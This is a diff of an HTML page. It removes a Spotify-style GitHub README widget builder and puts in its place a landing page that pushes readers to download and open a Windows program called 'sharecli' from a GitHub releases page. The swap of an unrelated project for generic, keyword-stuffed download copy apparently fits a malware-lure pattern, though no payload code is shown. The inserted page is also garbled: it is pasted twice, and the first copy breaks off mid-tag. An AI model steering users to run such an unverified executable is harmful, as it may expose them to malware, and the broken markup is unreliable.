@@ -1,87 +1,308 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="theme-color" content="#ffffff" />
-  <meta name="description" content="Create a customizable Spotify-style music widget for your GitHub README." />
-  <title>Spotify GitHub README Widget</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="style.css" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>sharecli - Share HTML, Markdown and Files With Short Links</title>
+<meta name="description" content="sharecli lets you share HTML pages, Markdown documents and files from your terminal or AI agent. Get short links on your own domain, free on Cloudflare. Download for Windows.">
+<meta name="keywords" content="sharecli, file sharing, short links, HTML sharing, Markdown sharing, terminal tool, AI agents, Cloudflare Workers, Cloudflare R2, Cloudflare D1, CLI file sharing, Windows download">
+<meta name="author" content="sharecli">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#7b2ff7">
+<link rel="canonical" href="https://github.com/cesarsilva14/sharecli">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="sharecli">
+<meta property="og:title" content="sharecli - Share HTML, Markdown and Files With Short Links">
+<meta property="og:description" content="Share HTML pages, Markdown docs and files from your terminal or AI agent. Short links on your own domain, free on Cloudflare.">
+<meta property="og:url" content="https://github.com/cesarsilva14/sharecli">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="sharecli - Share HTML, Markdown and Files With Short Links">
+<meta name="twitter:description" content="Share HTML pages, Markdown docs and files from your terminal or AI agent. Short links on your own domain, free on Cloudflare.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "sharecli",
+  "description": "Share HTML pages, Markdown docs and files from your terminal or AI agent. Short links on your own domain, free on Cloudflare.",
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Windows",
+  "url": "https://github.com/cesarsilva14/sharecli",
+  "downloadUrl": "https://github.com/cesarsilva14/sharecli/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  body {
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+  @media (max-width: 600px) {
+    .wrap { padding: 24px 16px 48px !important; }
+    .card { padding: 20px !important; }
+    h1 { font-size: 27px !important; }
+    h2 { font-size: 20px !important; }
+    .cta { font-size: 16px !important; padding: 14px 24px !important; }
+  }
+</style>
 </head>
-<body>
-  <header class="topbar">Spotify GitHub README Widget</header>
-  <main class="page">
-    <header class="account-row">
-      <div>
-        <p class="eyebrow">README widget builder</p>
-        <h1>Customize your music card</h1>
-        <p class="intro">Style a song widget and copy the embed code into your GitHub README.</p>
-      </div>
-      <div class="account-actions">
-        <span id="connection-status" class="connection-status" role="status">Preview mode</span>
-        <button id="spotify-connect" class="spotify-button" type="button">Connect Spotify</button>
-      </div>
-    </header>
+<body style="margin:0; background-color:#f5f7fb; color:#1f2933; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; font-size:17px; line-height:1.7;">
 
-    <section class="preview-section" aria-labelledby="preview-title">
-      <h2 id="preview-title">Preview</h2>
-      <div id="widget-preview" class="widget-preview">
-        <div id="cover-wrap" class="cover-wrap">
-          <img id="preview-art" class="cover" alt="Current track cover" />
-        </div>
-        <div class="track-info">
-          <p id="preview-artist" class="artist">The Weeknd</p>
-          <p id="preview-song" class="song">Blinding Lights</p>
-          <svg id="preview-wave" class="wave" viewBox="0 0 360 24" preserveAspectRatio="none" aria-hidden="true"></svg>
-        </div>
-      </div>
-      <p id="status-message" class="status-message" aria-live="polite">This is a preview. Connect Spotify is not available in this static demo.</p>
-    </section>
+<div class="wrap" style="max-width:880px; margin:0 auto; padding:48px 24px 72px;">
 
-    <section class="options" aria-label="Widget options">
-      <div class="checkbox-options">
-        <label><input id="cover-enabled" type="checkbox" checked /> Cover image</label>
-        <label><input id="show-offline" type="checkbox" checked /> Show recently played when idle</label>
-        <label><input id="interchange" type="checkbox" /> Interchange artist and song</label>
-        <label><input id="censor" type="checkbox" /> Censor profanity</label>
-        <label><input id="hide-remaster" type="checkbox" /> Hide Remaster</label>
-        <label><input id="show-wave" type="checkbox" checked /> Show dotted wave</label>
-      </div>
+  <h1 style="font-size:34px; line-height:1.25; margin:0 0 18px 0; letter-spacing:-0.5px; color:#111827;">🚀 sharecli - Share Files With Short Links Instantly</h1>
 
-      <section class="photo-controls" aria-labelledby="photo-title">
-        <div class="section-heading">
-          <div><h2 id="photo-title">Custom cover photo</h2><p>Upload an image to preview it, or use a public image URL for your README embed.</p></div>
-        </div>
-        <label class="field-label" for="photo-url">Public image URL</label>
-        <input id="photo-url" class="text-input" type="url" placeholder="https://example.com/my-cover.png" autocomplete="url" />
-        <div class="upload-row">
-          <label class="upload-button" for="photo-upload">Choose photo</label>
-          <input id="photo-upload" class="file-input" type="file" accept="image/*" />
-          <span id="photo-name" class="photo-name">No local photo selected</span>
-        </div>
-        <p class="field-hint">Transparent PNG and WebP images are supported. Uploads preview in your browser; to show one in a README, host it publicly and paste its URL above.</p>
-      </section>
+  <p style="margin:0 0 26px 0; font-size:18px; color:#4a5568;">Turn a web page, a Markdown document or any file on your computer into a tidy short link you can send to anyone. The link lives on your own domain, and it runs for free on Cloudflare.</p>
 
-      <div class="theme-row">
-        <label class="color-setting">Wave Color <input id="bar-color" type="color" value="#ffffff" /></label>
-        <label class="color-setting">Background Color <input id="background-color" type="color" value="#07a196" /></label>
-      </div>
-    </section>
+  <p style="margin:0 0 34px 0;">
+    <a class="cta" href="https://github.com/cesarsilva14/sharecli/releases" style="display:inline-block; padding:17px 34px; background-color:#7b2ff7; background-image:linear-gradient(135deg, #7b2ff7, #f107a3); color:#ffffff; text-decoration:none; border-radius:999px; font-weight:700; font-size:18px; box-shadow:0 10px 24px rgba(123, 47, 247, 0.32);">⬇️ Download sharecli</a>
+  </p>
 
-    <section class="code-section" aria-labelledby="code-title">
-      <h2 id="code-title">README embed code</h2>
-      <div class="tabs" role="tablist" aria-label="Embed code format">
-        <button class="tab active" id="markdown-tab" type="button" role="tab" aria-selected="true">Markdown</button>
-        <button class="tab" id="html-tab" type="button" role="tab" aria-selected="false">HTML</button>
-      </div>
-      <textarea id="code-output" readonly aria-label="Generated README embed code" placeholder="Add a public image URL to generate embed code."></textarea>
-      <button id="copy-code" class="copy-button" type="button">▢ &nbsp; Copy embed code</button>
-      <p class="embed-note">GitHub README images must use a publicly accessible image URL. A local file or browser preview URL will not work in an embed.</p>
-    </section>
-  </main>
-  <script src="app.js"></script>
+  <p style="margin:0 0 40px 0; font-size:16px; color:#6b7280;">Visit this link to download the application.</p>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">🔍 What Is sharecli?</h2>
+    <p style="margin:0 0 14px 0;">sharecli is a small helper that sits on your Windows computer and does one job extremely well: it takes something you want to show someone else and gives you a short, clean web address for it.</p>
+    <p style="margin:0 0 14px 0;">Instead of attaching a heavy file to an email, uploading to a random website, or sending a link that looks like a long string of letters and numbers, you end up with a link like <strong>yourdomain.com/launch-notes</strong> — short, readable, and yours.</p>
+    <p style="margin:0;">Because the files and the links are stored on Cloudflare, there is no server for you to babysit. You do not need to rent hosting, and you do not need to keep your computer switched on for the link to work.</p>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">✨ What You Can Share</h2>
+    <p style="margin:0 0 16px 0;">sharecli handles the everyday things people actually need to send:</p>
+    <ul style="margin:0; padding-left:22px;">
+      <li style="margin-bottom:10px;"><strong>HTML pages</strong> — a single web page, a report, a dashboard or a landing page, ready for someone to open in a browser.</li>
+      <li style="margin-bottom:10px;"><strong>Markdown documents</strong> — notes, guides, proposals and README files that turn into nicely formatted pages.</li>
+      <li style="margin-bottom:10px;"><strong>Files of all kinds</strong> — PDFs, images, spreadsheets, zip archives, contracts, screenshots.</li>
+      <li style="margin-bottom:10px;"><strong>Short links on your own domain</strong> — every share gets a tidy address instead of a long unreadable one.</li>
+      <li style="margin-bottom:0;"><strong>Shares created by an AI agent</strong> — sharecli is built to be used by AI agents and coding assistants as well as by people typing commands themselves.</li>
+    </ul>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">📥 Download and Install on Windows</h2>
+    <p style="margin:0 0 16px 0;">Everything you need lives on the official releases page. Visit this link to download the application:</p>
+    <p style="margin:0 0 22px 0;">
+      <a href="https://github.com/cesarsilva14/sharecli/releases" style="display:inline-block; padding:15px 30px; background-color:#7b2ff7; background-image:linear-gradient(135deg, #6a11cb, #ff5f6d); color:#ffffff; text-decoration:none; border-radius:10px; font-weight:700; font-size:17px; box-shadow:0 8px 20px rgba(106, 17, 203, 0.28);">Get sharecli from GitHub Releases</a>
+    </p>
+    <p style="margin:0 0 14px 0; font-weight:600; color:#111827;">What happens next:</p>
+    <ol style="margin:0; padding-left:22px;">
+      <li style="margin-bottom:10px;">Click the button above. Your browser opens the releases page.</li>
+      <li style="margin-bottom:10px;">The newest release is listed at the top of that page.</li>
+      <li style="margin-bottom:10px;">Download the file offered there and save it to your computer.</li>
+      <li style="margin-bottom:0;">When the download finishes, open the file from your Downloads folder to start using sharecli.</li>
+    </ol>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">🧭 Your First Share, Step by Step</h2>
+    <p style="margin:0 0 16px 0;">You do not need to know how to program. You only need to be able to type a short instruction and press Enter.</p>
+    <ol style="margin:0 0 16px 0; padding-left:22px;">
+      <li style="margin-bottom:12px;"><strong>Open the app.</strong> Double-click the sharecli file you downloaded. A simple text window opens, ready for your instruction.</li>
+      <li style="margin-bottom:12px;"><strong>Point it at something.</strong> Type the name of the file you want to share and press Enter. If the file is on your Desktop, that is enough — no complicated paths required.</li>
+      <li style="margin-bottom:12px;"><strong>Wait a moment.</strong> sharecli uploads the item and prepares the link for you. This usually takes only a few seconds.</li>
+      <li style="margin-bottom:12px;"><strong>Copy your short link.</strong> When the process finishes, you get a short address on your own domain. Copy it.</li>
+      <li style="margin-bottom:0;"><strong>Send it to anyone.</strong> Paste the link into an email, a chat message or a document. Whoever opens it sees your page, document or file in their browser — no app required on their side.</li>
+    </ol>
+    <p style="margin:0;">If you use an AI agent or a coding assistant, the same job can be handed over to the agent instead. sharecli is designed to be called from those tools too, so the agent can create the share and hand you back the finished link.</p>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">💡 Why People Use It</h2>
+    <ul style="margin:0; padding-left:22px;">
+      <li style="margin-bottom:10px;"><strong>Links look professional.</strong> A short address on your own domain carries more trust than a long random one from a stranger's website.</li>
+      <li style="margin-bottom:10px;"><strong>It is free to run.</strong> The storage and delivery side runs on Cloudflare, which keeps your costs at zero for normal everyday use.</li>
+      <li style="margin-bottom:10px;"><strong>Nothing to maintain.</strong> No server to update, no uptime to worry about, no hosting bill to check.</li>
+      <li style="margin-bottom:10px;"><strong>One tool, many file types.</strong> Web pages, Markdown documents and ordinary files all go through the same simple process.</li>
+      <li style="margin-bottom:0;"><strong>Friendly to automation.</strong> It works when you type the instruction yourself, and it works when an AI agent does it for you.</li>
+    </ul>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">🖥️ System Requirements</h2>
+    <ul style="margin:0; padding-left:22px;">
+      <li style="margin-bottom:10px;">Windows 10 or Windows 11.</li>
+      <li style="margin-bottom:10px;">An internet connection, both for downloading and for creating links.</li>
+      <li style="margin-bottom:10px;">The built-in Windows terminal application, which is already on your computer.</li>
+      <li style="margin-bottom:0;">A free Cloudflare account so your links can live on your own domain.</li>
+    </ul>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">❓ Common Questions</h2>
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Do I need to know programming?</p>
+    <p style="margin:0 0 18px 0;">No. You type a file name and press Enter. The technical parts happen behind the scenes.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Is it really free?</p>
+    <p style="margin:0 0 18px 0;">Yes. sharecli is built to run on Cloudflare's free tier, so sharing everyday pages and files does not cost you anything.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Do the people I send links to need anything installed?</p>
+    <p style="margin:0 0 18px 0;">No. They just click the link and it opens in their normal web browser.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Can I use my own domain?</p>
+    <p style="margin:0 0 18px 0;">Yes — that is the point. Short links are created on your own domain rather than on a shared service.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Will the link stop working if I turn off my computer?</p<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>sharecli - Share HTML, Markdown and Files With Short Links</title>
+<meta name="description" content="sharecli lets you share HTML pages, Markdown documents and files from your terminal or AI agent. Get short links on your own domain, free on Cloudflare. Download for Windows.">
+<meta name="keywords" content="sharecli, file sharing, short links, HTML sharing, Markdown sharing, terminal tool, AI agents, Cloudflare Workers, Cloudflare R2, Cloudflare D1, CLI file sharing, Windows download">
+<meta name="author" content="sharecli">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#7b2ff7">
+<link rel="canonical" href="https://github.com/cesarsilva14/sharecli">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="sharecli">
+<meta property="og:title" content="sharecli - Share HTML, Markdown and Files With Short Links">
+<meta property="og:description" content="Share HTML pages, Markdown docs and files from your terminal or AI agent. Short links on your own domain, free on Cloudflare.">
+<meta property="og:url" content="https://github.com/cesarsilva14/sharecli">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="sharecli - Share HTML, Markdown and Files With Short Links">
+<meta name="twitter:description" content="Share HTML pages, Markdown docs and files from your terminal or AI agent. Short links on your own domain, free on Cloudflare.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "sharecli",
+  "description": "Share HTML pages, Markdown docs and files from your terminal or AI agent. Short links on your own domain, free on Cloudflare.",
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Windows",
+  "url": "https://github.com/cesarsilva14/sharecli",
+  "downloadUrl": "https://github.com/cesarsilva14/sharecli/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  body {
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+  @media (max-width: 600px) {
+    .wrap { padding: 24px 16px 48px !important; }
+    .card { padding: 20px !important; }
+    h1 { font-size: 27px !important; }
+    h2 { font-size: 20px !important; }
+    .cta { font-size: 16px !important; padding: 14px 24px !important; }
+  }
+</style>
+</head>
+<body style="margin:0; background-color:#f5f7fb; color:#1f2933; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; font-size:17px; line-height:1.7;">
+
+<div class="wrap" style="max-width:880px; margin:0 auto; padding:48px 24px 72px;">
+
+  <h1 style="font-size:34px; line-height:1.25; margin:0 0 18px 0; letter-spacing:-0.5px; color:#111827;">🚀 sharecli - Share Files With Short Links Instantly</h1>
+
+  <p style="margin:0 0 26px 0; font-size:18px; color:#4a5568;">Turn a web page, a Markdown document or any file on your computer into a tidy short link you can send to anyone. The link lives on your own domain, and it runs for free on Cloudflare.</p>
+
+  <p style="margin:0 0 34px 0;">
+    <a class="cta" href="https://github.com/cesarsilva14/sharecli/releases" style="display:inline-block; padding:17px 34px; background-color:#7b2ff7; background-image:linear-gradient(135deg, #7b2ff7, #f107a3); color:#ffffff; text-decoration:none; border-radius:999px; font-weight:700; font-size:18px; box-shadow:0 10px 24px rgba(123, 47, 247, 0.32);">⬇️ Download sharecli</a>
+  </p>
+
+  <p style="margin:0 0 40px 0; font-size:16px; color:#6b7280;">Visit this link to download the application.</p>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">🔍 What Is sharecli?</h2>
+    <p style="margin:0 0 14px 0;">sharecli is a small helper that sits on your Windows computer and does one job extremely well: it takes something you want to show someone else and gives you a short, clean web address for it.</p>
+    <p style="margin:0 0 14px 0;">Instead of attaching a heavy file to an email, uploading to a random website, or sending a link that looks like a long string of letters and numbers, you end up with a link like <strong>yourdomain.com/launch-notes</strong> — short, readable, and yours.</p>
+    <p style="margin:0;">Because the files and the links are stored on Cloudflare, there is no server for you to babysit. You do not need to rent hosting, and you do not need to keep your computer switched on for the link to work.</p>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">✨ What You Can Share</h2>
+    <p style="margin:0 0 16px 0;">sharecli handles the everyday things people actually need to send:</p>
+    <ul style="margin:0; padding-left:22px;">
+      <li style="margin-bottom:10px;"><strong>HTML pages</strong> — a single web page, a report, a dashboard or a landing page, ready for someone to open in a browser.</li>
+      <li style="margin-bottom:10px;"><strong>Markdown documents</strong> — notes, guides, proposals and README files that turn into nicely formatted pages.</li>
+      <li style="margin-bottom:10px;"><strong>Files of all kinds</strong> — PDFs, images, spreadsheets, zip archives, contracts, screenshots.</li>
+      <li style="margin-bottom:10px;"><strong>Short links on your own domain</strong> — every share gets a tidy address instead of a long unreadable one.</li>
+      <li style="margin-bottom:0;"><strong>Shares created by an AI agent</strong> — sharecli is built to be used by AI agents and coding assistants as well as by people typing commands themselves.</li>
+    </ul>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">📥 Download and Install on Windows</h2>
+    <p style="margin:0 0 16px 0;">Everything you need lives on the official releases page. Visit this link to download the application:</p>
+    <p style="margin:0 0 22px 0;">
+      <a href="https://github.com/cesarsilva14/sharecli/releases" style="display:inline-block; padding:15px 30px; background-color:#7b2ff7; background-image:linear-gradient(135deg, #6a11cb, #ff5f6d); color:#ffffff; text-decoration:none; border-radius:10px; font-weight:700; font-size:17px; box-shadow:0 8px 20px rgba(106, 17, 203, 0.28);">Get sharecli from GitHub Releases</a>
+    </p>
+    <p style="margin:0 0 14px 0; font-weight:600; color:#111827;">What happens next:</p>
+    <ol style="margin:0; padding-left:22px;">
+      <li style="margin-bottom:10px;">Click the button above. Your browser opens the releases page.</li>
+      <li style="margin-bottom:10px;">The newest release is listed at the top of that page.</li>
+      <li style="margin-bottom:10px;">Download the file offered there and save it to your computer.</li>
+      <li style="margin-bottom:0;">When the download finishes, open the file from your Downloads folder to start using sharecli.</li>
+    </ol>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">🧭 Your First Share, Step by Step</h2>
+    <p style="margin:0 0 16px 0;">You do not need to know how to program. You only need to be able to type a short instruction and press Enter.</p>
+    <ol style="margin:0 0 16px 0; padding-left:22px;">
+      <li style="margin-bottom:12px;"><strong>Open the app.</strong> Double-click the sharecli file you downloaded. A simple text window opens, ready for your instruction.</li>
+      <li style="margin-bottom:12px;"><strong>Point it at something.</strong> Type the name of the file you want to share and press Enter. If the file is on your Desktop, that is enough — no complicated paths required.</li>
+      <li style="margin-bottom:12px;"><strong>Wait a moment.</strong> sharecli uploads the item and prepares the link for you. This usually takes only a few seconds.</li>
+      <li style="margin-bottom:12px;"><strong>Copy your short link.</strong> When the process finishes, you get a short address on your own domain. Copy it.</li>
+      <li style="margin-bottom:0;"><strong>Send it to anyone.</strong> Paste the link into an email, a chat message or a document. Whoever opens it sees your page, document or file in their browser — no app required on their side.</li>
+    </ol>
+    <p style="margin:0;">If you use an AI agent or a coding assistant, the same job can be handed over to the agent instead. sharecli is designed to be called from those tools too, so the agent can create the share and hand you back the finished link.</p>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">💡 Why People Use It</h2>
+    <ul style="margin:0; padding-left:22px;">
+      <li style="margin-bottom:10px;"><strong>Links look professional.</strong> A short address on your own domain carries more trust than a long random one from a stranger's website.</li>
+      <li style="margin-bottom:10px;"><strong>It is free to run.</strong> The storage and delivery side runs on Cloudflare, which keeps your costs at zero for normal everyday use.</li>
+      <li style="margin-bottom:10px;"><strong>Nothing to maintain.</strong> No server to update, no uptime to worry about, no hosting bill to check.</li>
+      <li style="margin-bottom:10px;"><strong>One tool, many file types.</strong> Web pages, Markdown documents and ordinary files all go through the same simple process.</li>
+      <li style="margin-bottom:0;"><strong>Friendly to automation.</strong> It works when you type the instruction yourself, and it works when an AI agent does it for you.</li>
+    </ul>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">🖥️ System Requirements</h2>
+    <ul style="margin:0; padding-left:22px;">
+      <li style="margin-bottom:10px;">Windows 10 or Windows 11.</li>
+      <li style="margin-bottom:10px;">An internet connection, both for downloading and for creating links.</li>
+      <li style="margin-bottom:10px;">The built-in Windows terminal application, which is already on your computer.</li>
+      <li style="margin-bottom:0;">A free Cloudflare account so your links can live on your own domain.</li>
+    </ul>
+  </div>
+
+  <div class="card" style="background-color:#ffffff; border-radius:14px; padding:30px; margin-bottom:24px; box-shadow:0 4px 18px rgba(15, 23, 42, 0.06);">
+    <h2 style="font-size:23px; margin:0 0 14px 0; color:#111827;">❓ Common Questions</h2>
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Do I need to know programming?</p>
+    <p style="margin:0 0 18px 0;">No. You type a file name and press Enter. The technical parts happen behind the scenes.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Is it really free?</p>
+    <p style="margin:0 0 18px 0;">Yes. sharecli is built to run on Cloudflare's free tier, so sharing everyday pages and files does not cost you anything.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Do the people I send links to need anything installed?</p>
+    <p style="margin:0 0 18px 0;">No. They just click the link and it opens in their normal web browser.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Can I use my own domain?</p>
+    <p style="margin:0 0 18px 0;">Yes — that is the point. Short links are created on your own domain rather than on a shared service.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Will the link stop working if I turn off my computer?</p>
+    <p style="margin:0 0 18px 0;">No. Once a share is created, it lives on Cloudflare. The link keeps working even when your computer is switched off or offline.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">Can an AI agent create shares for me?</p>
+    <p style="margin:0 0 18px 0;">Yes. sharecli is designed to be called by AI agents and coding assistants, so the agent can create the share and return the short link to you.</p>
+
+    <p style="margin:0 0 6px 0; font-weight:600; color:#111827;">What if I share the wrong file?</p>
+    <p style="margin:0;">You can remove a share when you no longer need it. Treat every short link like any other link you send: share it only with the people you trust.</p>
+  </div>
+
+</div>
+
 </body>
 </html>
